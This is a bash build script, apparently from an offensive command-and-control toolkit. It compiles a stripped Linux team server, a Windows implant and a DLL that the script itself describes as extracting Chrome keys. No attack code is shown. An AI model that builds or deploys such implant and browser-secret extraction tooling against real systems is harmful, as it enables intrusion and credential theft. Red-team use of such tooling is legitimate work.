#!/bin/bash
set -e

echo "[*] Building carved C2 framework..."

mkdir -p build/payloads

echo "[*] Building gobound.dll..."
cd gobound/dll
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o ../../build/payloads/gobound.dll
cd ../..

echo "[*] Building server..."
cd server/cmd
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o ../../build/server
cd ../..

echo "[*] Building implant..."
cd implant/cmd
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o ../../build/implant.exe
cd ../..

echo "[+] Build complete!"
echo "    build/server              - Linux team server"
echo "    build/implant.exe         - Windows implant"
echo "    build/payloads/gobound.dll - Chrome key extraction DLL"
